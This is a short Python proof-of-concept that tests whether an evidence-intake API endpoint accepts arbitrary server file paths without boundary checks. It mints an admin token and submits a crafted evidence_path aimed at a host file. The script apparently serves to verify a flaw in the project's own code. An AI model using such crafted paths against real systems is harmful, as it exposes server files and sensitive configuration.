"""PoC 2: Zero-Copy Arbitrary Host File Registration on Offline Intake.
Verifies that POST /api/intake/offline registers arbitrary server files
(such as pyproject.toml or sensitive configs) when supplied with ':ro' without any
path boundary or system directory checks.
"""
import sys
from pathlib import Path
from fastapi.testclient import TestClient
from backend.app.main import create_app
from backend.app.auth.dependencies import get_user_store
from backend.app.auth.security import create_access_token

def run_poc():
    app = create_app()
    client = TestClient(app)

    store = get_user_store()
    user = store.get_by_username("admin")[0]
    token = create_access_token({"sub": user.username, "user_id": user.id, "badge_id": user.badge_id, "role": user.role})

    headers = {"Authorization": f"Bearer {token}"}
    target_arbitrary_file = str(Path("pyproject.toml").resolve())
    
    payload = {
        "case_id": "test_poc_zero_copy",
        "evidence_path": f"{target_arbitrary_file}:ro",
        "artifact_type": "arbitrary_file",
        "actor": "malicious_user"
    }

    resp = client.post("/api/intake/offline", json=payload, headers=headers)
    print(f"POST /api/intake/offline Status: {resp.status_code}")
    
    if resp.status_code == 200:
        data = resp.json()
        print(f"CONFIRMED: Arbitrary file registered without boundary check! Total artifacts: {len(data['artifacts'])}")
        print(f"Artifact original_path: {data['artifacts'][0]['original_path']}")
        print(f"Artifact blob_path: {data['artifacts'][0]['blob_path']}")
        return True
    else:
        print(f"FAILED: Expected 200, got {resp.status_code}: {resp.text}")
        return False

if __name__ == "__main__":
    success = run_poc()
    sys.exit(0 if success else 1)
